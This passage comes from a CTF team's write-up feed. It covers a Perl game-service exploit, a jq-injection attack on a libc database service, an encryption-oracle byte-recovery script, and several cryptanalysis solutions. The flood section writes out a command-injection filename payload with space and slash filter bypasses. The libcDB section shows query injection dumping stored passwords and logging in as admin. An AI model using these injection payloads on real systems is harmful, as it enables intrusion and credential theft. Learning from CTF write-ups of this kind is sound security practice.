  context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;

  &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;plaintext&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(plaintext)
  r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;challenge/scss&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;plaintext&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ciphertext&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;encrypt&amp;#39;&lt;/span&gt;, mode])
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;wait_for_close()
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
  &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ciphertext&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ciphertext

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;recover&lt;/span&gt;(target_ciphertext, mode):
  message &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(target_ciphertext)):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;):
      plaintext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; message &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; bytes([j])
      ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; encrypt(plaintext, mode)
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; target_ciphertext&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(ciphertext):
        message &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plaintext
        &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(i, message)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; message

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():
  &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;challenge/flag_encrypted&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    target_ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()

  &lt;span style=&#34;color:#75715e&#34;&gt;# print(recover(target_ciphertext, &amp;#39;ecb&amp;#39;))&lt;/span&gt;
  &lt;span style=&#34;color:#75715e&#34;&gt;# print(recover(target_ciphertext, &amp;#39;cbc&amp;#39;))&lt;/span&gt;
  &lt;span style=&#34;color:#75715e&#34;&gt;# print(recover(target_ciphertext, &amp;#39;cfb&amp;#39;))&lt;/span&gt;

  &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(recover(target_ciphertext, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ofb&amp;#39;&lt;/span&gt;))
  &lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39;3k{my_hands_are_registered_as_lethal_weapons_that_means_we_get_into_a_fight_i_accidentally_kill_you_i_go_to_jail}&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;flood-misc-495-points&#34;&gt;flood (Misc; 495 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;We have a service running remotely. The source code, &lt;code&gt;service.pl&lt;/code&gt;, is given to us. Perl sadness&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:perl&#34;&gt;&lt;a class=&#34;footnote&#34; href=&#34;#fn:perl&#34;&gt;2&lt;/a&gt;&lt;/sup&gt; strikes back...&lt;/p&gt;

&lt;p&gt;Obviously, we can actually earn more gold by &lt;em&gt;selling gold&lt;/em&gt;. From the source code:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;? how much gold u wanna spend\n&amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;! 1 GOLD = 1000 POINTS\n&amp;gt; &amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $subm &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;STDIN&amp;gt;&lt;/span&gt;;
chomp $subm;
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( ($subm) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; $gold  &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; int($subm)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
  $gold   &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; ($subm);
  $points &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; ($subm)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Why? We can set &lt;code&gt;$subm = -0.9999&lt;/code&gt;... In this case we can generate as much gold as we want.&lt;/p&gt;

&lt;p&gt;Another vulnerability comes from theh following line that runs during &lt;em&gt;load game&lt;/em&gt;. This API opens if you are rich enough -- well, we are.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $name is what we can control. However, `.`, `/` and ` ` are forbidden.&lt;/span&gt;
open (SAVEGAME, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/app/files/&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$name) &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; break;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;How? For example, if &lt;code&gt;$name = &amp;quot;||ls|&amp;quot;;&lt;/code&gt; it executes &lt;code&gt;ls&lt;/code&gt; from shell. But what if we want to execute &lt;code&gt;ls /&lt;/code&gt; given that  and &lt;code&gt;/&lt;/code&gt; are forbidden? In short, we can use &lt;code&gt;\t&lt;/code&gt; (&amp;lt;TAB&amp;gt;) in place of the  (&amp;lt;SPACE&amp;gt;), and &lt;code&gt;$(expr\tsubstr\t$PWD\t1\t1)&lt;/code&gt; in place of &lt;code&gt;/&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Hence, we can send use &lt;code&gt;||ls\t&amp;quot;$(expr\tsubstr\t$PWD\t1\t1)&amp;quot;\t-al|&lt;/code&gt; as our name and the directory can be listed. The following line is curious...&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-rw-r--r--   1 root root    30 Jul 23 14:26 fcad0373020fa6ede979389f558b396f4cd38ec1_README&amp;#39;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can use &lt;code&gt;cat /fcad0373020fa6ede979389f558b396f4cd38ec1_README&lt;/code&gt; (with the above substitution) as our name. Finally the flag is there: &lt;code&gt;3k{p333rl_aInt_7hat_deAd_Y3t}&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;libcdb-misc-494-points&#34;&gt;libcDB (Misc; 494 points)&lt;/h2&gt;

&lt;p&gt;We are given a libc database search (which looks useful and we should definitely have one ourselves!). Playing with the API we have met the following error:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; .search fprintf 0x4b970 ..
jq: error: Invalid numeric literal at EOF at line 1, column 3 (while parsing &amp;#39;...&amp;#39;) at &amp;lt;top-level&amp;gt;, line 1:
. as $maindb | .libcDB[] | select(.symbol==&amp;#34;fprintf&amp;#34;) | select(.address|contains(&amp;#34;309616&amp;#34;)) | ...                                                                                              
jq: 1 compile error&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If we have to make an educated guess on the actual query, it would be:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;jq &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;. as $maindb | .libcDB[] | select(.symbol==&amp;#34;[SYMBOL]&amp;#34;) \
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   | select(.address|contains(&amp;#34;[ADDR]&amp;#34;)) | .[FILTER]&amp;#39;&lt;/span&gt; test.json&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Read along the documentation of &lt;code&gt;jq&lt;/code&gt;, we have experimented around:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; .search fprintf 0 |$maindb|keys|{id:.[]}
Found:
	id		libcDB
Found:
	id		users&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;&amp;gt; .search fprintf 0 |$maindb.users[]|keys|{id:.[]}
Found:
	id		password
Found:
	id		username&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;&amp;gt; .search fprintf 0 |$maindb.users[]|{id:.username,symbol:.password}
Found:
	id		3k
	symbol		notaflag
Found:
	id		James
	symbol		Hetfield
Found:
	id		Lars
	symbol		Ulrich
Found:
	id		Dead
	symbol		pool
Found:
	id		admin
	symbol		v3ryL0ngPwC4nTgu3SS0xfff
Found:
	id		jim
	symbol		carrey&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Okay. Great, we have the credentials of the admin. Connecting to the service again, and this time we are signing in with it.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ nc libcdb.3k.ctf.to 7777
Login    &amp;gt; admin
Password &amp;gt; v3ryL0ngPwC4nTgu3SS0xfff
Authenticated {&amp;#34;users&amp;#34;:{&amp;#34;username&amp;#34;:&amp;#34;admin&amp;#34;,&amp;#34;password&amp;#34;:&amp;#34;v3ryL0ngPwC4nTgu3SS0xfff&amp;#34;}}
                            
 __    _ _       ____  _____ 
|  |  |_| |_ ___|    \| __  |
|  |__| | . |  _|  |  | __ -|
|_____|_|___|___|____/|_____|
                         as a service

Type .help for help

&amp;gt; .secret
3k{jq_is_r3ally_HelpFULL_3af4bcd97f5}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;footnotes&#34;&gt;

&lt;hr&gt;

&lt;ol&gt;
&lt;li id=&#34;fn:dns-rebind&#34;&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/DNS_rebinding&#34;&gt;DNS rebinding from Wikipedia&lt;/a&gt;
 &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:dns-rebind&#34;&gt;&lt;sup&gt;[return]&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li id=&#34;fn:perl&#34;&gt;&lt;a href=&#34;https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf&#34;&gt;The Perm Jam 2: The Camel Strikes Back - @na7irub&lt;/a&gt;
 &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:perl&#34;&gt;&lt;sup&gt;[return]&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>PwnThyBytes CTF 2019 Writeup</title>
      <link>https://b6a.black/posts/2019-10-02-pwnthybytes/</link>
      <pubDate>Wed, 02 Oct 2019 23:20:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2019-10-02-pwnthybytes/</guid>
      <description>&lt;h2 id=&#34;pass-the-hash-warmuplearning-50-points&#34;&gt;Pass the Hash (Warmup/Learning; 50 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;challenge-summary&#34;&gt;Challenge Summary&lt;/h3&gt;

&lt;p&gt;We are given a &lt;em&gt;peculiar&lt;/em&gt; hash algorithm that generates 64-byte long hashes, which wraps of &lt;em&gt;sha0&lt;/em&gt;, &lt;em&gt;sha1&lt;/em&gt;, &lt;em&gt;sha256&lt;/em&gt; and &lt;em&gt;ripemd160&lt;/em&gt;. The hash takes two arguments, &lt;em&gt;salt&lt;/em&gt; (20 bytes) and &lt;em&gt;password&lt;/em&gt; (22 bytes). We are allowed to control the salt, whilst the goal is to find the password within 1024 queries.&lt;/p&gt;

&lt;h4 id=&#34;hash-construction&#34;&gt;Hash construction&lt;/h4&gt;

&lt;p&gt;We are given a &lt;em&gt;peculiar&lt;/em&gt; hash algorithm that generates 64-byte long hashes, which wraps of &lt;em&gt;sha0&lt;/em&gt;, &lt;em&gt;sha1&lt;/em&gt;, &lt;em&gt;sha256&lt;/em&gt; and &lt;em&gt;ripemd160&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The hash is defined by:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;$L_0, R_0 = \text{password}\ |\ \text{salt}\ |\ \text{password}$ ($L_0, R_0$ separate the 64-byte block)&lt;/li&gt;
&lt;li&gt;$L_{i+1} = L_i \oplus h_R(R_i), R_{i+1} = R_i \oplus h_L(L_i)$, for $i = 0, 1, ..., 15$.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Here $h_L$ and $h_R$ are the two hash algorithms that uses one of the commonly used hash algorithms based on the content. As this is a 32-byte block, if the hash algorithm itself does not consist 32 bytes, it would repeat itself until there are 32 bytes.&lt;/p&gt;

&lt;h3 id=&#34;solution&#34;&gt;Solution&lt;/h3&gt;

&lt;h4 id=&#34;part-i-repeat-repeat-repeat&#34;&gt;Part I: Repeat, repeat, repeat&lt;/h4&gt;

&lt;div class=&#34;alert info&#34;&gt;
  One question that had brought up to my mind is: What if the $h_L$ and $h_R$ uses solely the 20-byte hash algorithms (i.e., all but sha256)?
&lt;/div&gt;
  

&lt;p&gt;Assume that 20-byte hash algorithms are used. Let&#39;s see what will happen in a round.&lt;/p&gt;

&lt;p&gt;Define $s_0\ |\ s_1\ |\ ...\ |\ s_9 := L_i\ | \ R_i$ and $t_0\ |\ t_1\ |\ ...\ |\ t_9 := L_{i+1}\ | \ R_{i+1}$, where:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;$s_0, s_2, s_3, s_6, s_7, s_9, t_0, t_2, t_3, t_6, t_7, t_9$ are 8 bytes long, and&lt;/li&gt;
&lt;li&gt;$s_1, s_4, s_5, s_8, t_1, t_4, t_5, t_8$ are 4 bytes long.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Then we have:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;$t_0\ |\ t_1\ |\ ...\ |\ t_4 = s_0\ |\ s_1\ |\ ...\ |\ s_4\ |\ h_R(s_5\ |\ s_6\ |\ ...\ |\ s_9)$, and&lt;/li&gt;
&lt;li&gt;$t_5\ |\ t_6\ |\ ...\ |\ t_9 = s_5\ |\ s_6\ |\ ...\ |\ s_9\ |\ h_L(s_0\ |\ s_1\ |\ ...\ |\ s_4)$.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;However, since the first and last 12 bytes of $h_R(\cdot)$ are equal, we have&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;$s_0 \oplus t_0 = s_3 \oplus t_3$, and&lt;/li&gt;
&lt;li&gt;$s_1 \oplus t_1 = s_4 \oplus t_4$.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The assumption applies on $h_L(\cdot)$ as well. Thus we have&lt;/p&gt;

&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;$s_5 \oplus t_5 = s_8 \oplus t_8$, and&lt;/li&gt;
&lt;li&gt;$s_6 \oplus t_6 = s_9 \oplus t_9$.&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&#34;alert info&#34;&gt;
  If we define $L_0, R_0$ by $a_0, a_1, &amp;hellip;, a_9$ and $L_{16}, R_{16}$ by $b_0, b_1, &amp;hellip;, b_9$ (their lengths are respectively equal to $s_0, s_1, &amp;hellip;, s_9$), we still have the below properties:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;$b_0 \oplus b_3 = a_0 \oplus a_3$,&lt;/li&gt;
&lt;li&gt;$b_1 \oplus b_4 = a_1 \oplus a_4$,&lt;/li&gt;
&lt;li&gt;$b_5 \oplus b_8 = a_5 \oplus a_8$, and&lt;/li&gt;
&lt;li&gt;$b_6 \oplus b_9 = a_6 \oplus a_9$.&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
  

&lt;h4 id=&#34;part-ii-what-does-it-mean&#34;&gt;Part II: What does it mean?&lt;/h4&gt;

&lt;p&gt;Let&#39;s look back how $L_0, R_0$ is defined - $\text{password}\ |\ \text{salt}\ |\ \text{password}$. This gives us two more properties:&lt;/p&gt;

&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;$a_0 = a_7, a_1 = a_8, a_2 = a_9$ (derived from passwords), and&lt;/li&gt;
&lt;li&gt;we can control the values of $a_3, a_4, a_5, a_6$.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;So... assuming that $h_L$ and $h_R$ uses solely the 20-byte hash algorithms, we can effectively find the password (namely $a_0, a_1, a_2$):&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;$a_0 = a_3 \oplus b_0 \oplus b_3$,&lt;/li&gt;
&lt;li&gt;$a_1 = a_4 \oplus b_1 \oplus b_4$ and&lt;/li&gt;
&lt;li&gt;$a_2 = a_9 = a_6 \oplus b_6 \oplus b_9$.&lt;/li&gt;
&lt;/ol&gt;

&lt;h4 id=&#34;part-iii-but-the-assumption-is-too-good-to-be-true&#34;&gt;Part III: But the assumption is &lt;em&gt;too&lt;/em&gt; good to be true!&lt;/h4&gt;

&lt;p&gt;As stated from the title, the assumption is quite hard to satisfy. What we need is, in each of the 16 rounds, $h_L$ and $h_R$ needs to pick an 20-byte hash algorithm instead of the 32-byte hash algorithm... Very difficult isn&#39;t it?&lt;/p&gt;

&lt;p&gt;The answer is &lt;em&gt;not really&lt;/em&gt;. The probability to use 20-byte hash algorithms all along is $0.75^{32}\approx 0.000145257$, which is approximately one out of 10000. We can visit the oracle 10 times, in average, to compute the password from the hash algorithm.&lt;/p&gt;

&lt;p&gt;It is very easy to know when we had the hash algorithm. From properties 2 and 3, we have:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[b_1 \oplus b_4 \oplus b_5 \oplus b_8 = a_1 \oplus a_4 \oplus a_5 \oplus a_8 = a_4 \oplus a_5.\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Writing the exploit script solving the challenge, we have the flag: &lt;code&gt;PTBCTF{420199e572e685af8e1782fde58fd0e9}&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;avec-cryptanalysis-856-points&#34;&gt;Avec? (Cryptanalysis; 856 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;harrier&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;challenge-summary-1&#34;&gt;Challenge Summary&lt;/h3&gt;

&lt;p&gt;This is a interesting question where we are given a ciphertext, encrypted using AES-GCM, with key and nonce generated by &lt;code&gt;polish_key(os.urandom(8))&lt;/code&gt; and concat itself.
The key and nonce is not provided though, so we have to somehow reverse the &lt;code&gt;polish_key&lt;/code&gt; process to know more about the key and nonce.&lt;/p&gt;

&lt;h3 id=&#34;solution-1&#34;&gt;Solution&lt;/h3&gt;

&lt;p&gt;I first thought this is a GCM nonce collision problem, but the 12 bytes nonce and nonce generation rejects this thought.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;polish_key&lt;/code&gt; function is the following:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;polish_key&lt;/span&gt;(key):
	key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes_to_long(key[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
	key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GF(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fetch_int(key)
	key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; key &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xbcafffff435&lt;/span&gt;
	key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; long_to_bytes( key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;integer_representation() )[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
	&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; len(key) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; key&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Which &lt;code&gt;0xbcafffff435&lt;/code&gt; is can be factored into $3\times5\times7\times257\times3019\times65537$. Knowing that $3^{32} - 1 = 3\times5\times7\times257\times65537$, the key is of order $3^{32}+1$ (or a factor of it). Hence, the entropy for key and nonce are 32 bits. Exhausting both of them at the same time requires $2^{64}$ trials... or really?&lt;/p&gt;

&lt;p&gt;Because the cipher is under GCM and with a known AAD, given a key $k$ and a ciphertext $c$, we can compute $\text{GHASH}_{k,c}(\text{AAD})$.&lt;/p&gt;

&lt;p&gt;Consider the GCM mode with its tag generation. The tag generation is given by $\text{tag} = E_k(\text{nonce}) \oplus \text{GHASH}_{k,c}(\text{AAD})$. Therefore, with known key $k$, one can find out the key-correspondent nonce by $\text{nonce} = D_k(\text{tag} \oplus \text{GHASH}_{k,c}(\text{AAD}))$.&lt;/p&gt;

&lt;p&gt;Therefore we can exhaust the key $k$ with $2^{32} + 1$ trials, for each key $k$ find its corresponding $nonce$ and see whether it is the correct one.&lt;/p&gt;

&lt;p&gt;We can even make it quickly by identifying the $\text{nonce}$ should end with &lt;code&gt;\x00\x00\x00\x01&lt;/code&gt; with this method, as it is using a 12-byte nonce.&lt;/p&gt;

&lt;p&gt;We initially use Sage to deal with the challenge, but it was way too slow (to generate the possible keys) and decided to use Python instead. But we don&#39;t want to use other language other than Sage to generate the keys...&lt;/p&gt;

&lt;p&gt;So what we have done is a simple multi-thread Sage key generator and a Python solver. And it was &lt;em&gt;wayyyyyyyyyyyy&lt;/em&gt; too slow... even with pypy.&lt;/p&gt;

&lt;p&gt;Both the key generator and the pypy solver are terribly slow. I cannot find a simple GHASH implementation to do the brute-forcing part. Computing $2^{16}$ keys takes me more than 3 mins in pypy... I just wanted to use something fast to test through the keys. BearSSL saids it can process &amp;gt;1000MBps according to its &lt;a href=&#34;https://www.bearssl.org/speed.html&#34;&gt;benchmark&lt;/a&gt;. Maybe I should use a language with fast compiled code.&lt;/p&gt;

&lt;p&gt;I am a Rustacean, so why not to do it in Rust? The result is blazingly fast. It could be solved within an hour with a 64-core computer (from one of my teammates). Sage was then the bottleneck, and thus I did not bother to improve the performance of the Rust solver.&lt;/p&gt;

&lt;p&gt;I should use Rust to generate keys to speedup the whole thing, but anyway, we solved it! :)&lt;/p&gt;

&lt;h2 id=&#34;wrong-ring-cryptanalysis-936-points&#34;&gt;Wrong Ring (Cryptanalysis; 936 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&#34;challenge-summary-2&#34;&gt;Challenge Summary&lt;/h3&gt;

&lt;p&gt;I personally see this is a cumbersome math. One of my teammates pointed out that this is similar to a &lt;em&gt;ring-LWE&lt;/em&gt;. But anyway, knowing that is a &lt;em&gt;ring-LWE&lt;/em&gt; does not help much.&lt;/p&gt;

&lt;p&gt;Okay, let&#39;s get back on track. A secret polynomial, $S$, is generated to derive the key. We are given eight polynomial pairs of $(A_k, B_k)$ such that $B_k(x) \equiv A_k(x)S(x) + \varepsilon_k(x)\ (\text{mod}\ p(x))$, where $\varepsilon_k$ is an error polynomial and $p(x) = x^{256} + 1486$.&lt;/p&gt;

&lt;h3 id=&#34;solution-2&#34;&gt;Solution&lt;/h3&gt;

&lt;h4 id=&#34;part-i-complicating-the-problem-a-bit&#34;&gt;Part I: Complicating the problem a bit&lt;/h4&gt;

&lt;p&gt;Let&#39;s make the polynomial concrete! Define:&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[A_k(x) = \sum_{i=0}^{255} a_{ki} x^i, B_k(x) = \sum_{i=0}^{255} b_{ki} x^i, \varepsilon_k(x) = \sum_{i=0}^{255} e_{ki} x^i, S(x) = \sum_{i=0}^{255} s_i x^i.\]&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;$a_{ki}, b_{ki}, s_i$ are all integers in the set $[0, 1486]$, while $e_{ki}$ are small real numbers.&lt;/p&gt;

&lt;p&gt;Then we have&lt;/p&gt;

&lt;p&gt;&lt;span  class=&#34;math&#34;&gt;\[\begin{aligned}
\sum_{i=0}^{255} b_{ki} x^i &amp;\equiv \left(\sum_{i=0}^{255} a_{ki} x^i\right)\left(\sum_{i=0}^{255} s_i x^i\right) + \sum_{i=0}^{255} e_i x^i \\
&amp;\equiv \sum_{i=0}^{510}\left(\sum_{j=\text{max}(0,i-255)}^{\text{min}(255,i)} a_{kj}s_{i-j}\right)x^i + \sum_{i=0}^{255} e_i x^i \\
&amp;\equiv \sum_{i=0}^{255}\left(\sum_{j=\text{max}(0,i-255)}^{\text{min}(255,i)} a_{kj}s_{i-j}\right)x^i + \sum_{i=256}^{510}\left(\sum_{j=\text{max}(0,i-255)}^{\text{min}(255,i)} a_{kj}s_{i-j}\right)x^i + \sum_{i=0}^{255} e_i x^i \\
&amp;\equiv \sum_{i=0}^{255}\left(\sum_{j=0}^i a_{kj}s_{i-j}\right)x^i + \sum_{i=256}^{510}\left(\sum_{j=i-255}^{255} a_{kj}s_{i-j}\right)x^i + \sum_{i=0}^{255} e_i x^i \\
